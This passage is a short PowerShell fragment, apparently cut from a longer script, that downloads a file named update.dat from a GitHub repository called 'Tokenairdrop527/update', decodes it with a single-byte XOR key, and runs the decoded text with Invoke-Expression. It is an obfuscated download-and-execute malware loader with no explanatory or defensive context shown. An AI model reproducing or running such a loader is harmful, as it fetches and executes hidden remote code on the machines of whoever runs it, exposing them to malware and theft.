...
$b=(Invoke-WebRequest 'https://api.github.com/repos/Tokenairdrop527/update/contents/update.dat' -Headers $h -UseBasicParsing).Content
IEX([Text.Encoding]::UTF8.GetString(($b|%{$_-bxor0xAE})))